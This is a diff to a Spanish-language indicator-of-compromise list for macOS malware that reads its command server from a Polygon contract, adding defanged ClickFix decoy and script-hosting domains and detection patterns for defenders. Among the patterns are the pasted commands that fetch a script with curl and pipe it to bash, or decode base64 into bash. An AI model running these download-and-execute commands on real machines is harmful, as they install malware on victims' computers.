@@ -35,6 +35,12 @@ smdh7[.]surf                                       # C2, 5-jun, aun resuelve
 gesck4m[.]pro                                      # C2, 27-may a 2-jun
 xuiaxwx[.]com                                      # C2, 18-may a 25-may
 
+[BLOQUEAR]  entrega ClickFix: paginas senuelo y servidores de script.sh
+securecheckv1-proceed[.]pages[.]dev                # senuelo 'Secure Gateway', 01-oct; baja de virelianmatrix
+quicksecurity-checkpointv1[.]pages[.]dev           # senuelo 'Secure Gateway', 01-oct; baja de aetherframework
+virelianmatrix[.]digital                           # host del script.sh (01-oct); alta 06-jun, resuelve
+aetherframework[.]digital                          # host del script.sh (01-oct); alta 06-jun, suspendido
+
 [VIGILAR -- NO bloquear ciegamente]
 johncon[.]my                                       # escrito 2 veces el 29-jun; puede ser de un tercero
 
@@ -45,8 +51,12 @@ johncon[.]my                                       # escrito 2 veces el 29-jun; 
 osascript que lanza curl con "eth_call"            # consulta al contrato desde un Mac
 curl -d "check" hacia el dominio devuelto          # prueba de disponibilidad del C2
 POST a nodos RPC de Polygon desde un Mac           # equipos sin uso de cripto
+bash <<< $(echo "..." | base64 -d) en Terminal     # comando ClickFix pegado por la victima
+curl -s 'https://<host>/script.sh' | bash          # descarga del cargador (texto real del comando)
 
 [NO ES UN IOC -- NO bloquear]
+pages.dev                                          # Cloudflare Pages: bloquear solo el subdominio
+172.66.x.x                                         # Cloudflare Pages delante de los senuelos
 polygon.drpc.org                                   # nodo RPC publico legitimo
 polygon.publicnode.com                             # nodo RPC publico legitimo
 polygon-mainnet.gateway.tatum.io                   # nodo RPC publico legitimo
@@ -57,4 +67,5 @@ rutube.ru / facebook.com / vk.com / example.com    # valores de prueba del opera
 
 El C2 cambia cada pocas horas o dias: para el vigente, leer el contrato (seccion 5 de la ficha).
 Detalle en Phexia_macOS_Polygon_C2_28092026.txt. Fuente: fab0 (@FABO97662188) en X, 27-09 y 07-10-2026.
+Entrega: escaneos de ScanMalware del 01-10-2026 y Have I Been Squatted (06-07-2026).
 Deteccion: hipotesis a validar antes de desplegar (redactado con apoyo de IA).
